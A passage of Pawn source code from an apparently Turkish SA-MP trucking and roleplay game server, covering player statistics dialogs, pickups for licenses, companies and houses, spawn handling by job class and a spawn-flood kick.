			case ClassBusDriver: format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Class: {00FF00}Bus driver\n", PlayerStatList);
			case ClassDolmusDriver: format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Class: {00FF00}Dolmuþ Þöförü\n", PlayerStatList);
			case ClassPilot: format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Class: {00FF00}Pilot\n", PlayerStatList);
			case ClassPolice: format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Class: {00FF00}Police\n", PlayerStatList);
			case ClassMafia: format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Class: {00FF00}Mafia\n", PlayerStatList);
            case ClassFBY: format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Class: {00FF00}FBY\n", PlayerStatList);
			case ClassCopcu: format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Class: {00FF00}Cöpcü\n", PlayerStatList);
			case ClassBanka: format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Class: {00FF00}Bankaci\n", PlayerStatList);
			case ClassFire: format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Class: {00FF00}Itfaiye\n", PlayerStatList);
			case ClassPboy: format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Class: {00FF00}Pizza\n", PlayerStatList);
		}
		// Add money and score of the player to the list
		format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Money: {00FF00}%i\n", PlayerStatList, APlayerData[clickedplayerid][PlayerMoney]);
		format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Score: {00FF00}%i\n", PlayerStatList, APlayerData[clickedplayerid][PlayerScore]);
		// Add wanted-level of the player to the list
		format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Wanted-level: {00FF00}%i\n", PlayerStatList, APlayerData[clickedplayerid][PlayerWanted]);
		// Add truckerlicense and busdriver license of the player to the list
		if (APlayerData[clickedplayerid][TruckerLicense] == 1)
			format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Trucker License: {00FF00}Yes\n", PlayerStatList);
		else
			format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Trucker License: {00FF00}No\n", PlayerStatList);

       if (APlayerData[clickedplayerid][PilotLicense] == 1)
			format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFF00}Pilot Ehliyeti: {FFFFFF}Mevcut\n", PlayerStatList);
		else
			format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFF00}Pilot Ehliyeti: {FFFFFF}Mevcut Degil\n", PlayerStatList);

		if (APlayerData[clickedplayerid][BusLicense] == 1)
			format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Bus License: {00FF00}Yes\n", PlayerStatList);
		else
			format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Bus License: {00FF00}No\n", PlayerStatList);
		if (APlayerData[clickedplayerid][DolmusLicense] == 1)
			format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Dolmus License: {00FF00}Yes\n", PlayerStatList);
		else
			format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Dolmus License: {00FF00}No\n", PlayerStatList);
		if (APlayerData[clickedplayerid][MafiaLicense] == 1)
			format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Mafia License: {00FF00}Yes\n", PlayerStatList);
		else
			format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Mafia License: {00FF00}No\n", PlayerStatList);

		format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Completed trucker jobs: {00FF00}%i\n", PlayerStatList, APlayerData[clickedplayerid][StatsTruckerJobs]);
		format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Completed convoy jobs: {00FF00}%i\n", PlayerStatList, APlayerData[clickedplayerid][StatsConvoyJobs]);
		format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Completed busdriver jobs: {00FF00}%i\n", PlayerStatList, APlayerData[clickedplayerid][StatsBusDriverJobs]);
		format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Completed dolmus jobs: {00FF00}%i\n", PlayerStatList, APlayerData[clickedplayerid][StatsDolmusDriverJobs]);
		format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Completed pilot jobs: {00FF00}%i\n", PlayerStatList, APlayerData[clickedplayerid][StatsPilotJobs]);
		format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Completed mafia jobs: {00FF00}%i\n", PlayerStatList, APlayerData[clickedplayerid][StatsMafiaJobs]);
		format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Stolen mafia-loads: {00FF00}%i\n", PlayerStatList, APlayerData[clickedplayerid][StatsMafiaStolen]);
		format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Fined players: {00FF00}%i\n", PlayerStatList, APlayerData[clickedplayerid][StatsPoliceFined]);
		format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Fined players Cevik Kuvvet: {00FF00}%i\n", PlayerStatList, APlayerData[clickedplayerid][StatsFBYFined]);
		format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Jailed players Cevik Kuvvet: {00FF00}%i\n", PlayerStatList, APlayerData[clickedplayerid][StatsFBYJailed]);
		format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Jailed players: {00FF00}%i\n", PlayerStatList, APlayerData[clickedplayerid][StatsPoliceJailed]);
		format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Completed Cöpcü jobs: {00FF00}%i\n", PlayerStatList, APlayerData[clickedplayerid][StatsCopcuJobs]);
		format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Completed Banka jobs: {00FF00}%i\n", PlayerStatList, APlayerData[clickedplayerid][StatsBankaJobs]);
		format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Completed Fire jobs: {00FF00}%i\n", PlayerStatList, APlayerData[clickedplayerid][StatsFireJobs]);
		format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Completed roadworker jobs: {00FF00}%i\n", PlayerStatList, APlayerData[clickedplayerid][StatsRoadworkerJobs]);
		format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Meters driven: {00FF00}%f\n", PlayerStatList, APlayerData[clickedplayerid][StatsMetersDriven]);

		// Count the number of houses/businesses that the player has and add them to the list
		NumHouses = Player_CountHouses(playerid);
		NumBusinesses = Player_CountBusiness(playerid);

		format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Houses: {00FF00}%i (double-click for stats)\n", PlayerStatList, NumHouses);
		format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Businesses: {00FF00}%i (double-click for stats)\n", PlayerStatList, NumBusinesses);

		// Store the player-id of the other player so the other dialogs can display his statistics further (houses, businesses, cars)
		APlayerData[playerid][DialogOtherPlayer] = clickedplayerid;

		// Show the statistics of the other player
		ShowPlayerDialog(playerid, DialogStatsOtherPlayer, DIALOG_STYLE_LIST, DialogTitle, PlayerStatList, TXT_DialogButtonSelect, TXT_DialogButtonCancel); // Let the player buy a license
	}

	return 1;
}


public OnPlayerSelectDynamicObject(playerid, objectid, modelid, Float: x, Float: y, Float: z)
{
	switch(SelectMode[playerid])
	{
	    case SELECT_MODE_EDIT:
		{
		    if(ObjeSistemde[objectid] == false) return SendClientMessage(playerid, 0xE74C3CFF, "Bu ev sistemine baðlý bir obje deðil.");
			EditingFurniture[playerid] = true;
			EditDynamicObject(playerid, objectid);
		}

	    case SELECT_MODE_SELL:
	    {
	        CancelEdit(playerid);
            if(ObjeSistemde[objectid] == false) return SendClientMessage(playerid, 0xE74C3CFF, "Bu ev sistemine baðlý bir obje deðil.");
			new data[e_furniture], string[128];
			SetPVarInt(playerid, "SelectedFurniture", objectid);
			Streamer_GetArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, data);
			format(string, sizeof(string), "%s satmak istiyormusunuz?\nAlacaðýn ödeme miktarý: {2ECC71}$%s.", HouseFurnitures[ data[ArrayID] ][HOName], convertNumber(HouseFurnitures[ data[ArrayID] ][Price]));
			ShowPlayerDialog(playerid, DIALOG_FURNITURE_SELL, DIALOG_STYLE_MSGBOX, "Satýþý Onayla", string, "Sat", "Vazgeç");
		}
	}

    SelectMode[playerid] = SELECT_MODE_NONE;
	return 1;
}
// This callback gets called when a player picks up any pickup
public OnPlayerPickUpPickup(playerid, pickupid)
{
	// If the player picks up the Buy_License pickup at the driving school in Doherty
	if (pickupid == Pickup_License)
	    // Ask the player which license he wants to buy
		ShowPlayerDialog(playerid, DialogBuyLicenses, DIALOG_STYLE_LIST, TXT_DialogLicenseTitle, TXT_DialogLicenseList, TXT_DialogButtonBuy, TXT_DialogButtonCancel); // Let the player buy a license

	// Þirket Sistemi
	new Yazi[512];

	foreach(new i:SRKTs)
	{
		if(Sirketler[i][SirketExist] != 1) continue;
		if(pickupid == Sirketler[i][SirketInfoPickup])
		{
			format(Yazi, 512, "{F8F8FF}Þirket Adý\t\t{00FF00}%s\n", Sirketler[i][SirketName]);
            format(Yazi, 512, "%s{F8F8FF}Sahibi\t\t\t{00FF00}%s\n", Yazi, Sirketler[i][SirketSahip]);
            format(Yazi, 512, "%s{F8F8FF}Kazanç Oraný\t\t{00FF00}%d/100\n", Yazi, Sirketler[i][SirketOran]);
            format(Yazi, 512, "%s{F8F8FF}Üye Sayýsý\t\t{00FF00}%d/%d\n", Yazi, Sirketler[i][SirketUye], Sirketler[i][SirketMaxUye]);
            format(Yazi, 512, "%s{F8F8FF}Araç Sayýsý\t\t{00FF00}%d/20", Yazi, GetSirketArabaCount(i));
	        ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{00FF00}Þirket Bilgileri", Yazi, "Kapat", "");
			break;
		}
	}
	return 1;
}

SpawnAMK(playerid)
{
	SetTimerEx("SpawnAMK_", 2000, false, "i", playerid);
}

forward SpawnAMK_(playerid);
public SpawnAMK_(playerid)
{
	SpawnDurdur[playerid] = 0;
}

// This callback gets called when a player spawns somewhere
public OnPlayerSpawn(playerid)
{
	// Ev Sistemi [ Reiss_Umut ]
	InHouse[playerid] = INVALID_HOUSE_ID;

	new query[128];
	mysql_format(Connection, query, sizeof(query), "SELECT * FROM housesales WHERE OldOwner='%e'", GetName(playerid));
	mysql_tquery(Connection, query, "HouseSaleMoney", "i", playerid);
	// PaintBall
	if(PlayerPBing[playerid] == true)
	{
	    new RandomSpawn = random(sizeof(PBSpawns));
	    new RandomSkins = random(sizeof(PBSkins));
		PaintSkin[playerid] = GetPlayerSkin(playerid);
	    SetPlayerSkin(playerid,PBSkins[RandomSkins]);
		SetPlayerPos(playerid,PBSpawns[RandomSpawn][0],PBSpawns[RandomSpawn][1],PBSpawns[RandomSpawn][2]);
		SetPlayerFacingAngle(playerid,PBSpawns[RandomSpawn][3]);
		SetPlayerHealth(playerid,100.0);
		SetPlayerArmour(playerid,50.0);
		ResetPlayerWeapons(playerid);
		PlayerPBing[playerid] = true;
		GivePlayerWeapon(playerid,24,99999);
		GivePlayerWeapon(playerid,25,99999);
		GivePlayerWeapon(playerid,31,99999);
		GivePlayerWeapon(playerid,29,99999);
		GivePlayerWeapon(playerid,34,99999);
	}
	if(strlen(APlayerData[playerid][playerMail]) == 0) ShowPlayerDialog(playerid, 25478, DIALOG_STYLE_INPUT, "Mail Kayýtý", "Lütfen mail adresini giriniz!\nMail adresiniz admin tarafýndan kontrol edilecektir!", "Kaydet", "Kick");
	
/*	 	if(!strcmp(GetName(playerid),"Mike",true)) {
        PutPlayerInVehicle(playerid, Coach1, 0);
	}
	else if(!strcmp(GetName(playerid),"Tom",true)) {
		PutPlayerInVehicle(playerid, Coach2, 0);
	}
	else if(!strcmp(GetName(playerid),"Andrew",true)) {
	    PutPlayerInVehicle(playerid, Barracks, 0);
	}
 	else if(!strcmp(GetName(playerid),"Johnson",true)) {
        PutPlayerInVehicle(playerid, LSPDcar, 0);
	}
	else if(!strcmp(GetName(playerid),"Anderson",true)) {
		PutPlayerInVehicle(playerid, Ambulance, 0);
	}
	else if(!strcmp(GetName(playerid),"Mathew",true)) {
	    PutPlayerInVehicle(playerid, Ambulanceheli, 0);
	}
	else if(!strcmp(GetName(playerid),"Davidson",true)) {
		PutPlayerInVehicle(playerid, Firetruck, 0);
	}
	else if(!strcmp(GetName(playerid),"Moralles",true)) {
	    PutPlayerInVehicle(playerid, Hunter, 0);
	}
	else if(!strcmp(GetName(playerid),"Yards",true)) {
		PutPlayerInVehicle(playerid, PDbike, 0);
	}
	else if(!strcmp(GetName(playerid),"Kelroy",true)) {
	    PutPlayerInVehicle(playerid, Train, 0);
	}
	else if(!strcmp(GetName(playerid),"Sarah",true)) {
		PutPlayerInVehicle(playerid, Infernus, 0);
	}
	else if(!strcmp(GetName(playerid),"Michael",true)) {
	    PutPlayerInVehicle(playerid, Sultan, 0);
	}
	else if(!strcmp(GetName(playerid),"Roy",true)) {
	    PutPlayerInVehicle(playerid, AT400, 0);
	 return 1;
}*/
	
	
	
	// Tren Sistemi
	if(!strcmp(GetName(playerid), "LSSF", true) && IsPlayerNPC(playerid))
 	{
		PutPlayerInVehicle(playerid, NPCLSSF, 0);
  		SetPlayerSkin(playerid, 17);
	    SetPlayerColor(playerid,0xFFFFFFFF);
    	return 1;
    }

	if(!strcmp(GetName(playerid), "LSLV", true) && IsPlayerNPC(playerid))
 	{
  		PutPlayerInVehicle(playerid, NPCLSLV, 0);
  		SetPlayerSkin(playerid, 17);
	    SetPlayerColor(playerid,0xFFFFFFFF);
    	return 1;
    }

	if(!strcmp(GetName(playerid), "LVLS", true) && IsPlayerNPC(playerid))
	{
 		PutPlayerInVehicle(playerid, NPCLVLS, 0);
   		SetPlayerSkin(playerid, 17);
 	    SetPlayerColor(playerid,0xFFFFFFFF);
        return 1;
	}

	if(!strcmp(GetName(playerid), "LVSF", true) && IsPlayerNPC(playerid))
 	{
 		PutPlayerInVehicle(playerid, NPCLVSF, 0);
   		SetPlayerSkin(playerid, 17);
 	    SetPlayerColor(playerid,0xFFFFFFFF);
     	return 1;
   	}

	if(!strcmp(GetName(playerid), "SFLV", true) && IsPlayerNPC(playerid))
 	{
		PutPlayerInVehicle(playerid, NPCSFLV, 0);
  		SetPlayerSkin(playerid, 17);
	    SetPlayerColor(playerid,0xFFFFFFFF);
    	return 1;
    }

	if(!strcmp(GetName(playerid), "SFLS", true) && IsPlayerNPC(playerid))
 	{
  		PutPlayerInVehicle(playerid, NPCSFLS, 0);
		SetPlayerSkin(playerid, 17);
	    SetPlayerColor(playerid,0xFFFFFFFF);
      	return 1;
  	}

  	// V5 Oyuncu Arayüzü
	ShowPlayerV5UI(playerid);

	// Metin ile sabah sabah delirmece xd

	PlayerPlaySound(playerid,1057,0,0,10.0);
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
	/*
	SendClientMessage(playerid, -1, "{ffff00}Sunucuda amaç mesleklerden birine girip görev yaparak para kazanmaktýr.");
	SendClientMessage(playerid, -1, "{ffff00}Oyunla ilgili yardým almak için {7FFFD4}/yardim {ffff00}yazabilirsiniz.");
	SendClientMessage(playerid, -1, "{ffff00}Komutlarý öðrenmek için {7FFFD4}/komutlar {ffff00}yazabilirsiniz.");
	SendClientMessage(playerid, -1, "{ffff00}Initial Gaming, size iyi oyunlar diliyor :)");
	*/
	// Ölüm Textdrawý
	PlayerTextDrawHide(playerid,TDEditor_PTD[playerid][0]);
	TextDrawHideForPlayer(playerid,TDEditor_TD[0]);
	TextDrawHideForPlayer(playerid,TDEditor_TD[1]);
	TextDrawHideForPlayer(playerid,TDEditor_TD[2]);


	// Always allow NPC's to spawn without logging in
	if (IsPlayerNPC(playerid))
		return 1;



	// Anti Flood Sistemi
	if(SpawnDurdur[playerid] == 1)
	{
	    SpawnSayisi[playerid]++;
	    if(SpawnSayisi[playerid] == 5)
	    {
			new Yazi[250];
			format(Yazi, 250, "{FF0000}%s {F8F8FF}sunucudan tekmelendi ( Spawn Flood )", GetName(playerid));
			SendClientMessageToAll(-1, Yazi);

			printf("[KICK] %s(%d) ( Spawn Flood )", GetName(playerid), playerid);
			SafeKick(playerid);
			return 1;
	    }
	}else{
	    SpawnSayisi[playerid] = 1;
	}
	SpawnDurdur[playerid] = 1;
	SpawnAMK(playerid);
/*	new YeniSpawnTick = GetTickCount();
	if(YeniSpawnTick - SonSpawnTick[playerid] < 2000)
	{
	    SpawnSayisi[playerid]++;
	    if(SpawnSayisi[playerid] == 5)
	    {
			new Yazi[250];
			format(Yazi, 250, "{FF0000}%s {F8F8FF}sunucudan tekmelendi ( Spawn Flood )", GetName(playerid));
			SendClientMessageToAll(-1, Yazi);

			printf("[KICK] %s(%d) ( Spawn Flood )", GetName(playerid), playerid);
			SafeKick(playerid);
			return 1;
	    }
	}else{
	    SpawnSayisi[playerid] = 1;
	}
	SonSpawnTick[playerid] = YeniSpawnTick;
*/
	// Check if the player properly logged in by typing his password
	if (APlayerData[playerid][LoggedIn] == false)
	{
		SendClientMessage(playerid, 0xFFFFFFFF, TXT_FailedLoginProperly);
	    SafeKick(playerid); // Kick the player if he didn't log in properly
	}

	// Þirket Sistemi
	ShowSirketZones(playerid);
	if(Sirket[playerid] != -1)
	{
		if(Sirketler[ Sirket[playerid] ][SirketBorc])
		{
  			SendClientMessage(playerid, -1, "{00FF00}Þirketiniz 7 gün içinde deðeri kadar para toplayamadý.");
	    	SendClientMessage(playerid, -1, "{00FF00}3 gün içinde bu parayý toplayamazsanýz þirketiniz kapanacaktýr.");
		}
	}

	// Spawn the player in the global world (where everybody plays the game)
    SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid, 0);

	// Oduncu Mesleði
	Oduncu_ShowMissionPlace(playerid);

	// Also set a variable that tracks in which house the player currently is
	APlayerData[playerid][CurrentHouse] = 0;

	// Disable the clock
	//TogglePlayerClock(playerid, 0);

	// Delete all weapons from the player
	if (APlayerData[playerid][PlayerClass] != ClassFBY && PlayerPBing[playerid] == false) {
		 ResetPlayerWeapons(playerid);
	}

	new Logican[200];

	// Set the missiontext based on the chosen class
	switch (APlayerData[playerid][PlayerClass])
	{
		case ClassTruckDriver: // Truck-driver class
		{
			SetPlayerColor(playerid, ColorClassTruckDriver); // Set the playercolor (chatcolor for the player and color on the map)
			SetPlayerTeam(playerid, 1);
			// Þirket Sistemi
			if(Sirket[playerid] != -1)
			{
			    if(Sirketler[ Sirket[playerid] ][SirketExist] == 1)
			    {
			    	SetPlayerPos(playerid, Sirketler[ Sirket[playerid] ][SirketX], Sirketler[ Sirket[playerid] ][SirketY], Sirketler[ Sirket[playerid] ][SirketZ]);
				}else{ Sirket[playerid] = -1; }
			}

			format(Logican, 200, "{FFCC00}%s(%d) {FFFFFF}Kamyoncu olarak spawn oldu.", GetName(playerid), playerid);
		}
		case ClassBusDriver: // Bus-driver class
		{
			SetPlayerColor(playerid, ColorClassBusDriver); // Set the playercolor (chatcolor for the player and color on the map)
            SetPlayerTeam(playerid, 1);

			format(Logican, 200, "{FFCC00}%s(%d) Otobus Soforu olarak spawn oldu.", GetName(playerid), playerid);
		}
		case ClassDolmusDriver: // Bus-driver class
		{
			SetPlayerColor(playerid, ColorClassDolmusDriver); // Set the playercolor (chatcolor for the player and color on the map)
            SetPlayerTeam(playerid, 1);

			format(Logican, 200, "{FFCC00}%s(%d) {FFFFFF}Dolmuþ Soforu olarak spawn oldu.", GetName(playerid), playerid);
		}
		case ClassPilot: // Pilot class
		{
			SetPlayerColor(playerid, ColorClassPilot); // Set the playercolor (chatcolor for the player and color on the map)
            SetPlayerTeam(playerid, 1);

			format(Logican, 200, "{FFCC00}%s(%d) {FFFFFF}Pilot olarak spawn oldu.", GetName(playerid), playerid);
		}
		case ClassPolice: // Police class
		{
			SetPlayerColor(playerid, ColorClassPolice); // Set the playercolor (chatcolor for the player and color on the map)
 			KillTimer(APlayerData[playerid][PlayerCheckTimer]);
			APlayerData[playerid][PlayerCheckTimer] = SetTimerEx("Police_CheckWantedPlayers", 1000, true, "i", playerid);
            SetPlayerTeam(playerid, 2);

			format(Logican, 200, "{FFCC00}%s(%d) {FFFFFF}Polis olarak spawn oldu.", GetName(playerid), playerid);
		}
		case ClassFBY: // FBY class
		{
			SetPlayerColor(playerid, ColorClassFBY); // Set the playercolor (chatcolor for the player and color on the map)
			KillTimer(APlayerData[playerid][PlayerCheckTimer]);
			APlayerData[playerid][PlayerCheckTimer] = SetTimerEx("FBY_CheckWantedPlayers", 1000, true, "i", playerid);
			SetPlayerTeam(playerid, 2);
			format(Logican, 200, "{FFCC00}%s(%d) {FFFFFF}Cevik Kuvvet olarak spawn oldu.", GetName(playerid), playerid);
			SendClientMessage(playerid, -1, "{ff0000}*** Sucsuzlara Sebebsiz yere Ates etmek veya öldürmek BAN SEBEBIDIR***.");
			SendClientMessage(playerid, -1, "{ff0000}*** Sucsuzlara Sebebsiz yere Ates etmek veya öldürmek BAN SEBEBIDIR***.");
			SendClientMessage(playerid, -1, "{ff0000}*** Sucsuzlara Sebebsiz yere Ates etmek veya öldürmek BAN SEBEBIDIR***.");
			    // Give up to 12 weapons to the player
			if (FBYGetsWeapons == true)
			{
			    // Give up to 12 weapons to the player
				for (new i; i < 12; i++)
				    SilahVer(playerid, AFBYWeapons[i], FBYWeaponsAmmo);
			}
		}
		case ClassPboy: // G class
		{
			SetPlayerColor(playerid, ColorClassPboy); // Set the playercolor (chatcolor for the player and color on the map)
			SetPlayerTeam(playerid, 67);

			format(Logican, 200, "%s(%d) Pizzaci olarak spawn oldu.", GetName(playerid), playerid);
		}
		case ClassMafia: // Mafia class
		{
			SetPlayerColor(playerid, ColorClassMafia); // Set the playercolor (chatcolor for the player and color on the map)
			// Start the PlayerCheckTimer to scan for players that carry mafia-loads (be sure the timer has been destroyed first)
			KillTimer(APlayerData[playerid][PlayerCheckTimer]);
			APlayerData[playerid][PlayerCheckTimer] = SetTimerEx("Mafia_CheckMafiaLoads", 1000, true, "i", playerid);
            SetPlayerTeam(playerid, 3);

			format(Logican, 200, "%s(%d) Mafya olarak spawn oldu.", GetName(playerid), playerid);
		}
		case ClassRoadWorker: // Roadworker class
		{
			SetPlayerColor(playerid, ColorClassRoadWorker); // Set the playercolor (chatcolor for the player and color on the map)
            SetPlayerTeam(playerid, 1);

			format(Logican, 200, "%s(%d) Yol Iscisi olarak spawn oldu.", GetName(playerid), playerid);
		}
		case ClassGemici: // Gemici class
		{
			SetPlayerColor(playerid, ColorClassGemici); // Set the playercolor (chatcolor for the player and color on the map)
            SetPlayerTeam(playerid, 1);

			format(Logican, 200, "%s(%d) Gemici olarak spawn oldu.", GetName(playerid), playerid);
		}
		case ClassOduncu: // Oduncu class
		{
			SetPlayerColor(playerid, ColorClassOduncu); // Set the playercolor (chatcolor for the player and color on the map)
            SetPlayerTeam(playerid, 1);

			format(Logican, 200, "%s(%d) Oduncu olarak spawn oldu.", GetName(playerid), playerid);
		}
		case ClassBalikci: // Balikci class
		{
			SetPlayerColor(playerid, ColorClassGemici); // Set the playercolor (chatcolor for the player and color on the map)
            SetPlayerTeam(playerid, 1);

			format(Logican, 200, "%s(%d) Balikci olarak spawn oldu.", GetName(playerid), playerid);
		}
		case ClassCopcu: // G class
		{
			SetPlayerColor(playerid, ColorClassCopcu); // Set the playercolor (chatcolor for the player and color on the map)
			SetPlayerTeam(playerid, 1);

			format(Logican, 200, "%s(%d) Cöpcü olarak spawn oldu.", GetName(playerid), playerid);
		}
		case ClassBanka: // G class
		{
			SetPlayerColor(playerid, ColorClassBanka); // Set the playercolor (chatcolor for the player and color on the map)
			SetPlayerTeam(playerid, 1);

			format(Logican, 200, "%s(%d) Bankaci olarak spawn oldu.", GetName(playerid), playerid);
		}
		case ClassFire: // G class
		{
			SetPlayerColor(playerid, ColorClassFire); // Set the playercolor (chatcolor for the player and color on the map)
			SetPlayerTeam(playerid, 1);

			format(Logican, 200, "%s(%d) Itfaiyeci olarak spawn oldu.", GetName(playerid), playerid);
		}
	}

	LOG(Logican);

/*
	vipver(playerid);
*/




	// Metin ile sabah sabah delirmeceler
	if(pSkin[playerid] != -1)
	{
	    SetPlayerSkin(playerid, pSkin[playerid]);
	}

	// If the player spawns and his jailtime hasn't passed yet, put him back in jail
	if (APlayerData[playerid][PlayerJailed] != 0)
	    Police_JailPlayer(playerid, APlayerData[playerid][PlayerJailed]);

	if (APlayerData[playerid][PlayerJailed] != 0)
	    FBY_JailPlayer(playerid, APlayerData[playerid][PlayerJailed]);

	// spec icin
	// Teleport the player to the latest position if he was spectating
	if (APlayerData[playerid][Spectating] == true)
	{
		SetPlayerPos(playerid, APlayerData[playerid][SpectateX], APlayerData[playerid][SpectateY], APlayerData[playerid][SpectateZ]);
		SetPlayerFacingAngle(playerid, APlayerData[playerid][SpectateA]);

		// Reset the coordinates
		APlayerData[playerid][Spectating] = false;
		APlayerData[playerid][SpectateX] = -1;
		APlayerData[playerid][SpectateY] = -1;
		APlayerData[playerid][SpectateZ] = -1;
		APlayerData[playerid][SpectateA] = -1;
	}

	// Anti Teleport Sistemi
	//AntiTPSafePlayer(playerid);

	PlayerPlaySound(playerid, 1098,0,0,0);
	return 1;
}

public busroutestoptimer(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 407)
	    {
	        TogglePlayerControllable(playerid, 1);
	        SendClientMessage(playerid, -1, "Acele et!");
	    }
	}
}

public OnPlayerPickUpDynamicPickup(playerid, STREAMER_TAG_PICKUP pickupid)
{
	// Ev Sistemi
	if(GetPVarInt(playerid, "HousePickupCooldown") < gettime())
	{
	    if(InHouse[playerid] == INVALID_HOUSE_ID) {
			foreach(new i : Houses)
			{
			    if(pickupid == HouseData[i][HousePickup])
			    {
			        SetPVarInt(playerid, "HousePickupCooldown", gettime() + HOUSE_COOLDOWN);
			        SetPVarInt(playerid, "PickupHouseID", i);

					if(!strcmp(HouseData[i][Owner], "-")) {
						new string[64];
						format(string, sizeof(string), "Bu ev satýlýk!\n\nFiyat: {2ECC71}$%s", convertNumber(HouseData[i][Price]));
						ShowPlayerDialog(playerid, DIALOG_BUY_HOUSE, DIALOG_STYLE_MSGBOX, "Satýlýk Ev", string, "Satýnal", "Çýk");
					}else{
					    if(HouseData[i][SalePrice] > 0 && strcmp(HouseData[i][Owner], GetName(playerid)))
					    {
                            new string[64];
							format(string, sizeof(string), "Bu ev satýlýk!\n\nFiyat: {2ECC71}$%s", convertNumber(HouseData[i][SalePrice]));
							ShowPlayerDialog(playerid, DIALOG_BUY_HOUSE_FROM_OWNER, DIALOG_STYLE_MSGBOX, "Satýlýk Ev", string, "Satýnal", "Çýk");
							return 1;
					    }

					    switch(HouseData[i][LockMode])
					    {
					        case LOCK_MODE_NOLOCK: SendToHouse(playerid, i);
					        case LOCK_MODE_PASSWORD: ShowPlayerDialog(playerid, DIALOG_HOUSE_PASSWORD, DIALOG_STYLE_INPUT, "Ev Þifreli", "Bu ev þifre ile korunmaktadýr.\n\nEvin þifresini giriniz:", "Gir", "Çýk");
							case LOCK_MODE_KEYS:
							{
							    new gotkeys = Iter_Contains(HouseKeys[playerid], i);
							    if(!gotkeys) if(!strcmp(HouseData[i][Owner], GetName(playerid))) gotkeys = 1;

								if(gotkeys) {
									SendToHouse(playerid, i);
								}else{
								    SendClientMessage(playerid, 0xE74C3CFF, "Bu ev kilitli ve sende anahtarý olmadýðýndan eve giremezsin.");
								}
							}

					        case LOCK_MODE_OWNER:
					        {
								if(!strcmp(HouseData[i][Owner], GetName(playerid))) {
								    SetPVarInt(playerid, "HousePickupCooldown", gettime() + HOUSE_COOLDOWN);
						            SendToHouse(playerid, i);
								}else{
								    SendClientMessage(playerid, 0xE74C3CFF, "Bu eve sadece sahibi girebilir.");
								}
					        }
					    }
					}

			        return 1;
			    }
			}
		}else{
			for(new i; i < sizeof(HouseInteriors); ++i)
			{
			    if(pickupid == HouseInteriors[i][intPickup])
			    {
			        SetPVarInt(playerid, "HousePickupCooldown", gettime() + HOUSE_COOLDOWN);
			        SetPlayerVirtualWorld(playerid, 0);
			        SetPlayerInterior(playerid, 0);
			        SetPlayerPos(playerid, HouseData[ InHouse[playerid] ][houseX], HouseData[ InHouse[playerid] ][houseY], HouseData[ InHouse[playerid] ][houseZ]);
			        InHouse[playerid] = INVALID_HOUSE_ID;
			        return 1;
			    }
			}
		}
	}
	// Çöpçü Mesleði
	OnPlayerEnterCopPickup(playerid, pickupid);

	// Hediye Paketi Sistemi
	HediyePaketiPickups(playerid, pickupid);
	return 1;
}

// This callback gets called whenever a player enters a checkpoint
public OnPlayerEnterCheckpoint(playerid)
{

	// Gizli Kasa Sistemi
	if(SakliKasaEnterCheckpoint(playerid)) return 1;

	// Check the player's class
	switch (APlayerData[playerid][PlayerClass])
	{
		case ClassTruckDriver: // Truckdriver class
			Trucker_OnPlayerEnterCheckpoint(playerid); // Process the checkpoint (load or unload goods)
		case ClassBusDriver: // BusDriver class
		    BusDriver_EnterCheckpoint(playerid);
        case ClassDolmusDriver: // BusDriver class
		{
			GameTextForPlayer(playerid, TXT_DolmusDriverMissionPassed, 3000, 4); // Show a message to let the player know he finished his job
			DolmusDriver_EndJob(playerid); // End the current mission
		}
		case ClassPilot: // Pilot class
			Pilot_OnPlayerEnterCheckpoint(playerid); // Process the checkpoint (load or unload)
		case ClassMafia: // Mafia class
			Mafia_OnPlayerEnterCheckpoint(playerid);
 		case ClassGemici: // Gemici class
			Gemici_EnterCheckpoint(playerid);
		case ClassCopcu: // G class
